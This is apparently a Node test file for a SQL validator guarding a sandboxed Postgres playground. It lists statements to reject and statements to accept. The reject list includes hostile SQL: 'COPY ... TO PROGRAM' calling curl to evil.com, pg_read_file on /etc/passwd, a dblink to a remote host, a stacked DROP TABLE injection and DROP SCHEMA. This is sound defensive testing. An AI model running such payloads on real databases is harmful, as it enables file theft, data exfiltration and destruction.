import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { validateUserSql } from "../sql-guard.ts";

const SESSION = "playground_abc123";

const MUST_REJECT: { sql: string; expectFragment?: string }[] = [
  { sql: "DROP TABLE accounts", expectFragment: "not allowed" },
  { sql: "DROP SCHEMA playground_abc123 CASCADE" }, // parser doesn't grammar this; rejected as invalid syntax — either way, blocked.
  { sql: "CREATE TABLE evil(x int)", expectFragment: "not allowed" },
  { sql: "ALTER TABLE accounts ADD COLUMN x int", expectFragment: "not allowed" },
  { sql: "TRUNCATE TABLE accounts", expectFragment: "not allowed" },
  { sql: "COPY accounts TO PROGRAM 'curl evil.com'", expectFragment: "disallowed keyword" },
  { sql: "COPY accounts FROM '/etc/passwd'", expectFragment: "disallowed keyword" },
  { sql: "SELECT pg_read_file('/etc/passwd')", expectFragment: "pg_read_file" },
  { sql: "SELECT pg_read_binary_file('/etc/passwd')", expectFragment: "pg_read_binary_file" },
  { sql: "SELECT pg_ls_dir('/')", expectFragment: "pg_ls_dir" },
  { sql: "SELECT pg_sleep(10)", expectFragment: "pg_sleep" },
  { sql: "SELECT pg_terminate_backend(1)", expectFragment: "pg_terminate_backend" },
  { sql: "SELECT * FROM pg_catalog.pg_user", expectFragment: "pg_catalog" },
  { sql: "SELECT * FROM information_schema.tables", expectFragment: "information_schema" },
  { sql: "SELECT * FROM other_session.accounts", expectFragment: "other_session" },
  { sql: "SELECT 1; DROP TABLE accounts; --", expectFragment: "only one statement" },
  { sql: "SET search_path = pg_catalog", expectFragment: "not allowed" },
  { sql: "SET LOCAL statement_timeout = '10s'", expectFragment: "not allowed" },
  { sql: "DO $$ BEGIN PERFORM 1; END $$", expectFragment: "not allowed" },
  { sql: "SHOW search_path", expectFragment: "not allowed" },
  { sql: "PREPARE p AS SELECT 1", expectFragment: "not allowed" },
  { sql: "COMMENT ON TABLE accounts IS 'evil'", expectFragment: "not allowed" },
  { sql: "SELECT dblink('host=evil', 'SELECT 1')", expectFragment: "dblink" },
  { sql: "SELECT pg_logical_emit_message(true, 'x', 'y')", expectFragment: "pg_logical" },
  { sql: "  ", expectFragment: "empty" },
  { sql: "x".repeat(5000), expectFragment: "4KB" },
];

const MUST_ACCEPT = [
  "SELECT * FROM accounts",
  "SELECT id, owner, balance FROM accounts WHERE id = 1",
  "INSERT INTO accounts(id, owner, balance) VALUES (1, 'Alice', 100)",
  "UPDATE accounts SET balance = balance - 10 WHERE id = 1",
  "DELETE FROM bookings WHERE day < CURRENT_DATE",
  "BEGIN",
  "BEGIN ISOLATION LEVEL SERIALIZABLE",
  "BEGIN TRANSACTION ISOLATION LEVEL READ COMMITTED",
  "COMMIT",
  "ROLLBACK",
  "WITH t AS (SELECT 1) SELECT * FROM t",
  "SELECT count(*) FROM bookings WHERE room = 7",
  // schema-qualified to session schema is fine
  `SELECT * FROM ${SESSION}.accounts`,
];

describe("sql-guard: rejections", () => {
  for (const { sql, expectFragment } of MUST_REJECT) {
    it(`rejects: ${sql.slice(0, 60)}`, () => {
      const r = validateUserSql(sql, SESSION);
      assert.equal(r.ok, false, `expected rejection for: ${sql}`);
      if (expectFragment && r.ok === false) {
        assert.ok(
          r.reason.toLowerCase().includes(expectFragment.toLowerCase()),
          `expected reason to contain "${expectFragment}", got "${r.reason}"`,
        );
      }
    });
  }
});

describe("sql-guard: acceptances", () => {
  for (const sql of MUST_ACCEPT) {
    it(`accepts: ${sql.slice(0, 60)}`, () => {
      const r = validateUserSql(sql, SESSION);
      assert.equal(
        r.ok,
        true,
        `expected acceptance for: ${sql}${r.ok === false ? ` — got "${r.reason}"` : ""}`,
      );
    });
  }
});
